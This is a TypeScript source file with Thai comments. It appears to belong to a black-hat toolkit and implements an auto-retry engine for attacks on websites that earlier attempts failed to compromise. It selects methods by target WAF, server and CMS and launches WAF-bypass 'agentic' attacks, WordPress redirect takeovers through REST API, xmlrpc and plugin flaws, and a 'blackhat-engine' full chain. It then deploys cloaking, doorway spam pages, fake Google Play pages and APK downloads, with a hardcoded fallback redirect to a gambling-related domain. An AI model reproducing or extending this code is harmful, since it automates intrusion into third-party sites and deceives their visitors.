/**
 * Auto-Retry Engine — เมื่อโจมตีล้มเหลว ลองวิธีอื่นอัตโนมัติ
 * 
 * Features:
 * 1. ดึง failed domains จาก ai_attack_history
 * 2. วิเคราะห์ failure context → เลือกวิธีที่ยังไม่เคยลอง
 * 3. Retry ด้วยวิธีใหม่ + บันทึก log
 * 4. รายงานผลผ่าน Telegram real-time
 * 5. สั่งผ่าน Telegram: "retry xxx.com" หรือ "retry all"
 */

import { getDb } from "./db";
import { aiAttackHistory, deployHistory } from "../drizzle/schema";
import { eq, desc, sql, and, ne } from "drizzle-orm";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

interface FailedDomain {
  domain: string;
  attempts: number;
  methodsTried: string[];
  lastError: string | null;
  lastAttempt: Date | null;
  waf: string | null;
  serverType: string | null;
  cms: string | null;
}

interface RetryPlan {
  domain: string;
  nextMethod: string;
  reason: string;
  confidence: "high" | "medium" | "low";
  previousAttempts: number;
  methodsTried: string[];
}

interface RetryResult {
  domain: string;
  method: string;
  success: boolean;
  durationMs: number;
  error?: string;
  details?: string;
}

interface RetryBatchResult {
  totalDomains: number;
  retried: number;
  succeeded: number;
  failed: number;
  skipped: number;
  results: RetryResult[];
  totalDurationMs: number;
}

// ═══════════════════════════════════════════════════════
//  FAILED DOMAIN ANALYSIS
// ═══════════════════════════════════════════════════════

const ALL_ATTACK_METHODS = [
  "scan_only",
  "redirect_only",
  "full_chain",
  "agentic_auto",
  "advanced_parasite_seo",
  "advanced_play_store",
  "advanced_cloaking",
  "advanced_doorway_pages",
  "advanced_apk_distribution",
  "advanced_all",
  "deploy_advanced",
];

/**
 * ดึง failed domains จาก DB พร้อมวิเคราะห์ว่าเคยลองวิธีไหนไปแล้ว
 */
export async function getFailedDomains(limit: number = 50): Promise<FailedDomain[]> {
  const db = await getDb();
  if (!db) return [];

  try {
    // Get domains that have at least one failed attempt and no success
    const rows = await db.select({
      domain: aiAttackHistory.targetDomain,
      method: aiAttackHistory.method,
      success: aiAttackHistory.success,
      errorMessage: aiAttackHistory.errorMessage,
      createdAt: aiAttackHistory.createdAt,
      waf: aiAttackHistory.waf,
      serverType: aiAttackHistory.serverType,
      cms: aiAttackHistory.cms,
    })
    .from(aiAttackHistory)
    .orderBy(desc(aiAttackHistory.createdAt))
    .limit(500);

    // Group by domain
    const domainMap = new Map<string, {
      attempts: number;
      methods: Set<string>;
      hasSuccess: boolean;
      lastError: string | null;
      lastAttempt: Date | null;
      waf: string | null;
      serverType: string | null;
      cms: string | null;
    }>();

    for (const row of rows) {
      const d = row.domain;
      if (!domainMap.has(d)) {
        domainMap.set(d, {
          attempts: 0,
          methods: new Set(),
          hasSuccess: false,
          lastError: null,
          lastAttempt: null,
          waf: null,
          serverType: null,
          cms: null,
        });
      }
      const entry = domainMap.get(d)!;
      entry.attempts++;
      if (row.method) entry.methods.add(row.method);
      if (row.success) entry.hasSuccess = true;
      if (!entry.lastAttempt || (row.createdAt && new Date(row.createdAt) > entry.lastAttempt)) {
        entry.lastAttempt = row.createdAt ? new Date(row.createdAt) : null;
        if (row.errorMessage) entry.lastError = row.errorMessage;
      }
      if (row.waf) entry.waf = row.waf;
      if (row.serverType) entry.serverType = row.serverType;
      if (row.cms) entry.cms = row.cms;
    }

    // Filter to only failed domains (no success) and sort by most recent
    const failedDomains: FailedDomain[] = [];
    for (const [domain, info] of Array.from(domainMap.entries())) {
      if (info.hasSuccess) continue; // Skip domains that already have a success
      failedDomains.push({
        domain,
        attempts: info.attempts,
        methodsTried: Array.from(info.methods),
        lastError: info.lastError,
        lastAttempt: info.lastAttempt,
        waf: info.waf,
        serverType: info.serverType,
        cms: info.cms,
      });
    }

    // Sort by most recent attempt first
    failedDomains.sort((a, b) => {
      if (!a.lastAttempt) return 1;
      if (!b.lastAttempt) return -1;
      return b.lastAttempt.getTime() - a.lastAttempt.getTime();
    });

    return failedDomains.slice(0, limit);
  } catch (error) {
    console.error("[AutoRetry] Error getting failed domains:", error);
    return [];
  }
}

// ═══════════════════════════════════════════════════════
//  SMART METHOD SELECTION
// ═══════════════════════════════════════════════════════

/**
 * เลือกวิธีถัดไปที่ยังไม่เคยลอง + มีโอกาสสำเร็จสูง
 */
function selectNextMethod(failed: FailedDomain): RetryPlan | null {
  const tried = new Set(failed.methodsTried);
  const hasWaf = failed.waf && failed.waf !== "none";
  const isWordPress = failed.cms?.toLowerCase()?.includes("wordpress");
  const isIIS = failed.serverType?.toLowerCase()?.includes("iis") || failed.serverType?.toLowerCase()?.includes("microsoft");
  const isApache = failed.serverType?.toLowerCase()?.includes("apache");
  const isNginx = failed.serverType?.toLowerCase()?.includes("nginx");

  // Priority order based on context
  const candidates: Array<{ method: string; reason: string; confidence: "high" | "medium" | "low"; priority: number }> = [];

  // 1. Agentic Auto — best for WAF bypass and complex targets
  if (!tried.has("agentic_auto")) {
    let priority = 80;
    let reason = "AI จะวิเคราะห์และเลือกวิธีโจมตีที่เหมาะสมอัตโนมัติ";
    if (hasWaf) {
      priority = 95;
      reason = `ตรวจพบ WAF (${failed.waf}) — AI จะ bypass อัตโนมัติ`;
    }
    candidates.push({ method: "agentic_auto", reason, confidence: hasWaf ? "high" : "medium", priority });
  }

  // 2. Redirect Only — good for WordPress
  if (!tried.has("redirect_only")) {
    let priority = 70;
    let reason = "วาง redirect โดยตรง ไม่ต้อง exploit ช่องโหว่";
    if (isWordPress) {
      priority = 90;
      reason = "WordPress มีช่องทาง redirect หลายวิธี (REST API, xmlrpc, plugin vulns)";
    }
    candidates.push({ method: "redirect_only", reason, confidence: isWordPress ? "high" : "medium", priority });
  }

  // 3. Full Chain — comprehensive attack
  if (!tried.has("full_chain")) {
    let priority = 60;
    let reason = "โจมตีเต็มรูปแบบ ทุกขั้นตอน";
    if (tried.has("scan_only")) {
      priority = 75;
      reason = "สแกนเสร็จแล้ว ลองโจมตีจริง";
    }
    candidates.push({ method: "full_chain", reason, confidence: "medium", priority });
  }

  // 4. Advanced techniques — for targets that resist basic attacks
  if (!tried.has("advanced_all") && !tried.has("deploy_advanced")) {
    let priority = 50;
    let reason = "เทคนิคขั้นสูง: Parasite SEO + Cloaking + Doorway Pages + Play Store + APK";
    if (tried.size >= 3) {
      priority = 85;
      reason = "ลองวิธีพื้นฐานหมดแล้ว — ใช้เทคนิคขั้นสูง 5 วิธีรวม";
    }
    candidates.push({ method: "deploy_advanced", reason, confidence: tried.size >= 3 ? "high" : "medium", priority });
  }

  // 5. Individual advanced techniques
  const advancedTechniques = [
    { method: "advanced_cloaking", reason: "Cloaking — แสดงเนื้อหาต่างกันให้ Googlebot vs user", priority: 45, best_for: "any" },
    { method: "advanced_parasite_seo", reason: "Parasite SEO — ฝังเนื้อหาบนเว็บ authority สูง", priority: 40, best_for: "edu,gov" },
    { method: "advanced_doorway_pages", reason: "Doorway Pages — สร้าง 50+ หน้าสแปม target keyword", priority: 35, best_for: "any" },
    { method: "advanced_play_store", reason: "Play Store Impersonation — หน้าเลียนแบบ Google Play", priority: 30, best_for: "any" },
    { method: "advanced_apk_distribution", reason: "APK Distribution — วาง APK download + tracking", priority: 25, best_for: "any" },
  ];

  for (const tech of advancedTechniques) {
    if (!tried.has(tech.method)) {
      let priority = tech.priority;
      // Boost priority for IIS/Apache targets with cloaking
      if (tech.method === "advanced_cloaking" && (isIIS || isApache)) {
        priority += 20;
      }
      candidates.push({
        method: tech.method,
        reason: tech.reason,
        confidence: "medium",
        priority,
      });
    }
  }

  // 6. Scan only — as last resort to gather more info
  if (!tried.has("scan_only") && tried.size > 0) {
    candidates.push({
      method: "scan_only",
      reason: "สแกนดูช่องโหว่เพิ่มเติม เพื่อวางแผนโจมตีใหม่",
      confidence: "high",
      priority: 20,
    });
  }

  if (candidates.length === 0) return null;

  // Sort by priority (highest first)
  candidates.sort((a, b) => b.priority - a.priority);
  const best = candidates[0];

  return {
    domain: failed.domain,
    nextMethod: best.method,
    reason: best.reason,
    confidence: best.confidence,
    previousAttempts: failed.attempts,
    methodsTried: failed.methodsTried,
  };
}

/**
 * สร้าง retry plans สำหรับ failed domains ทั้งหมด
 */
export function createRetryPlans(failedDomains: FailedDomain[]): RetryPlan[] {
  const plans: RetryPlan[] = [];
  for (const domain of failedDomains) {
    const plan = selectNextMethod(domain);
    if (plan) plans.push(plan);
  }
  return plans;
}

// ═══════════════════════════════════════════════════════
//  RETRY EXECUTION
// ═══════════════════════════════════════════════════════

/**
 * Retry โจมตี domain เดียวด้วยวิธีที่เลือก
 */
export async function retryDomain(domain: string, method?: string): Promise<RetryResult> {
  const startTime = Date.now();

  try {
    // If no method specified, auto-select
    if (!method) {
      const failedDomains = await getFailedDomains(100);
      const target = failedDomains.find(d => d.domain === domain);
      if (target) {
        const plan = selectNextMethod(target);
        if (plan) {
          method = plan.nextMethod;
        } else {
          return { domain, method: "none", success: false, durationMs: 0, error: "ลองทุกวิธีแล้ว ไม่มีวิธีใหม่ให้ลอง" };
        }
      } else {
        method = "agentic_auto"; // Default for unknown domains
      }
    }

    // Execute based on method
    let result: RetryResult;

    if (method === "scan_only") {
      const { analyzeDomain } = await import("./seo-engine");
      const analysis = await analyzeDomain(domain, "gambling");
      result = {
        domain, method, success: true,
        durationMs: Date.now() - startTime,
        details: `DA:${analysis.currentState.estimatedDA} DR:${analysis.currentState.estimatedDR} BL:${analysis.currentState.estimatedBacklinks} Indexed:${analysis.currentState.isIndexed}`,
      };

    } else if (method === "redirect_only") {
      const { pickRedirectUrl } = await import("./agentic-attack-engine");
      const redirectUrl = await pickRedirectUrl();
      const { executeRedirectTakeover } = await import("./redirect-takeover");
      const results = await executeRedirectTakeover({ targetUrl: `https://${domain}`, ourRedirectUrl: redirectUrl });
      const succeeded = results.filter(r => r.success);
      result = {
        domain, method,
        success: succeeded.length > 0,
        durationMs: Date.now() - startTime,
        details: succeeded.length > 0
          ? `Succeeded: ${succeeded.map(r => r.method).join(", ")}`
          : `All ${results.length} methods failed`,
        error: succeeded.length === 0 ? `All ${results.length} redirect methods failed` : undefined,
      };

    } else if (method === "full_chain") {
      const { pickRedirectUrl } = await import("./agentic-attack-engine");
      const redirectUrl = await pickRedirectUrl();
      const { runFullChain } = await import("./blackhat-engine");
      const report = await runFullChain(domain, redirectUrl);
      const successPhases = report.phases.filter((p: any) => p.status === "success" || p.summary?.includes("success"));
      const success = successPhases.length > 0 || report.totalPayloads > 0;
      result = {
        domain, method, success,
        durationMs: Date.now() - startTime,
        details: `${report.phases.length} phases, ${report.totalPayloads} payloads`,
        error: !success ? `Full chain: no successful phases` : undefined,
      };

    } else if (method === "agentic_auto") {
      const { startAgenticSession, pickRedirectUrl, getAgenticSessionStatus } = await import("./agentic-attack-engine");
      const redirectUrl = await pickRedirectUrl();
      const session = await startAgenticSession({
        userId: 1,
        redirectUrls: [redirectUrl],
        maxTargetsPerRun: 10,
        maxConcurrent: 3,
        targetCms: ["wordpress"],
        mode: "full_auto",
        customDorks: [`site:${domain}`],
      });
      
      // Poll for real results instead of reporting success immediately
      // Wait up to 5 minutes (300s) for session to complete, checking every 15s
      const MAX_POLL_MS = 300_000;
      const POLL_INTERVAL_MS = 15_000;
      const pollStart = Date.now();
      let finalStatus: any = null;
      
      while (Date.now() - pollStart < MAX_POLL_MS) {
        await new Promise(r => setTimeout(r, POLL_INTERVAL_MS));
        const status = await getAgenticSessionStatus(session.sessionId);
        if (!status) break;
        
        // Session finished (completed, error, or stopped)
        if (!status.isRunning || status.status === "completed" || status.status === "error" || status.status === "stopped") {
          finalStatus = status;
          break;
        }
      }
      
      if (finalStatus) {
        const succeeded = (finalStatus.targetsSucceeded as number) || 0;
        const attacked = (finalStatus.targetsAttacked as number) || 0;
        const discovered = (finalStatus.targetsDiscovered as number) || 0;
        result = {
          domain, method,
          success: succeeded > 0,
          durationMs: Date.now() - startTime,
          details: succeeded > 0
            ? `Agentic session #${session.sessionId}: ${succeeded}/${attacked} targets succeeded (${discovered} discovered)`
            : `Agentic session #${session.sessionId}: 0/${attacked} targets succeeded (${discovered} discovered) — status: ${finalStatus.status}`,
          error: succeeded === 0 ? `Agentic session completed but no targets succeeded` : undefined,
        };
      } else {
        // Timed out waiting for session — report as pending, not success
        result = {
          domain, method,
          success: false,
          durationMs: Date.now() - startTime,
          details: `Agentic session #${session.sessionId} still running after 5min — check /status ${session.sessionId}`,
          error: "Session still running — results pending",
        };
      }

    } else if (method === "deploy_advanced" || method.startsWith("advanced_")) {
      const { generateAndDeployAdvanced } = await import("./advanced-deploy-engine");
      const { pickRedirectUrl } = await import("./agentic-attack-engine");
      let redirectUrl: string;
      try {
        redirectUrl = await pickRedirectUrl();
      } catch {
        redirectUrl = "https://hkt956.org/";
      }

      const technique = method.replace("advanced_", "").replace("deploy_advanced", "all");
      const techniques = technique === "all" ? undefined : [technique];

      const { generation, deployment } = await generateAndDeployAdvanced(domain, redirectUrl, {
        techniques,
        userId: 1,
      });

      result = {
        domain, method,
        success: deployment.deployedFiles > 0,
        durationMs: Date.now() - startTime,
        details: `Generated: ${generation.totalPayloads} payloads, Deployed: ${deployment.deployedFiles}/${deployment.totalFiles}, Verified: ${deployment.verifiedFiles}`,
        error: deployment.deployedFiles === 0 ? `Deploy failed: 0/${deployment.totalFiles} files` : undefined,
      };

    } else {
      result = { domain, method, success: false, durationMs: 0, error: `Unknown method: ${method}` };
    }

    // Save to attack history
    try {
      const db = await getDb();
      if (db) {
        await db.insert(aiAttackHistory).values({
          userId: 1,
          targetDomain: domain,
          method: `retry_${method}`,
          success: result.success,
          durationMs: result.durationMs,
          errorMessage: result.error || null,
          aiReasoning: `Auto-retry: ${result.details || ""}`,
          createdAt: new Date(),
        });
      }
    } catch (e) { /* ignore log errors */ }

    return result;
  } catch (error: any) {
    return {
      domain,
      method: method || "unknown",
      success: false,
      durationMs: Date.now() - startTime,
      error: error.message,
    };
  }
}

/**
 * Retry ทุก failed domains อัตโนมัติ
 */
export async function retryAllFailed(options?: {
  maxRetries?: number;
  onProgress?: (current: number, total: number, result: RetryResult) => Promise<void>;
}): Promise<RetryBatchResult> {
  const startTime = Date.now();
  const maxRetries = options?.maxRetries || 20;
  
  const failedDomains = await getFailedDomains(maxRetries);
  const plans = createRetryPlans(failedDomains);

  const batchResult: RetryBatchResult = {
    totalDomains: failedDomains.length,
    retried: 0,
    succeeded: 0,
    failed: 0,
    skipped: failedDomains.length - plans.length,
    results: [],
    totalDurationMs: 0,
  };

  for (let i = 0; i < plans.length; i++) {
    const plan = plans[i];
    const result = await retryDomain(plan.domain, plan.nextMethod);
    batchResult.results.push(result);
    batchResult.retried++;

    if (result.success) {
      batchResult.succeeded++;
    } else {
      batchResult.failed++;
    }

    if (options?.onProgress) {
      await options.onProgress(i + 1, plans.length, result);
    }

    // Small delay between retries to avoid overwhelming
    if (i < plans.length - 1) {
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
  }

  batchResult.totalDurationMs = Date.now() - startTime;
  return batchResult;
}

/**
 * ดู retry plan สำหรับ domain เดียว (preview ก่อน retry)
 */
export async function getRetryPlan(domain: string): Promise<RetryPlan | null> {
  const failedDomains = await getFailedDomains(100);
  const target = failedDomains.find(d => d.domain === domain);
  if (!target) return null;
  return selectNextMethod(target);
}

/**
 * สรุปสถิติ retry
 */
export async function getRetryStats(): Promise<{
  totalFailed: number;
  retriable: number;
  exhausted: number;
  recentRetries: Array<{ domain: string; method: string; success: boolean; createdAt: Date | null }>;
}> {
  const failedDomains = await getFailedDomains(100);
  const plans = createRetryPlans(failedDomains);

  // Get recent retry results
  const db = await getDb();
  let recentRetries: Array<{ domain: string; method: string; success: boolean; createdAt: Date | null }> = [];
  if (db) {
    try {
      const rows = await db.select({
        domain: aiAttackHistory.targetDomain,
        method: aiAttackHistory.method,
        success: aiAttackHistory.success,
        createdAt: aiAttackHistory.createdAt,
      })
      .from(aiAttackHistory)
      .where(sql`${aiAttackHistory.method} LIKE 'retry_%'`)
      .orderBy(desc(aiAttackHistory.createdAt))
      .limit(20);
      
      recentRetries = rows.map(r => ({
        domain: r.domain,
        method: r.method || "",
        success: r.success || false,
        createdAt: r.createdAt,
      }));
    } catch { /* ignore */ }
  }

  return {
    totalFailed: failedDomains.length,
    retriable: plans.length,
    exhausted: failedDomains.length - plans.length,
    recentRetries,
  };
}
